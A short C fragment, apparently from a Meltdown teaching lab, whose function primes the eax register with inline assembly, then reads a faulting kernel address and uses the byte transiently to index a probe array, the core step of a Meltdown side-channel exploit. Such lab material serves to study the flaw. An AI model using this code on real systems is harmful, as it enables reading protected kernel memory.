void meltdown_asm(unsigned long kernel_data_addr)
{
	char kernel_data = 0;
	
	// Give eax register something to do
	asm volatile(
		".rept 400;"
		"add $0x141, %%eax;"
		".endr;"
		:
		:
		: "eax"
	);
	
	// The following statement will cause an exception
	kernel_data = *(char*)kernel_data_addr;
	array[kernel_data * 4096 + DELTA] += 1;
}
